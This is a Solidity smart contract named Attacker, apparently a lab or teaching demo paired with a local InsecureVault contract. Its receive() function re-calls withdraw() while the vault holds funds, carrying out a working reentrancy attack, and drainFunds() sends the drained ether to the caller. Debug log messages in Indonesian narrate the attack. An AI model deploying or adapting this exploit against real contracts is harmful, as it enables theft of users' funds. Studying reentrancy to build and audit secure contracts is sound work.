// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./InsecureVault.sol"; 
import "hardhat/console.sol";

contract Attacker {
    address public victimAddress;

    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
    }

    function attack() public payable {
        InsecureVault(victimAddress).deposit{value: 1 ether}();
        InsecureVault(victimAddress).withdraw();
    }

    receive() external payable {
        console.log("   [Attacker] receive() terpicu! Memanggil 'withdraw()' lagi...");

        if (InsecureVault(victimAddress).getBalance() > 0) {
            InsecureVault(victimAddress).withdraw();
        }
    }

    function drainFunds() public {
        (bool success, bytes memory data) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to drain funds");
    }
}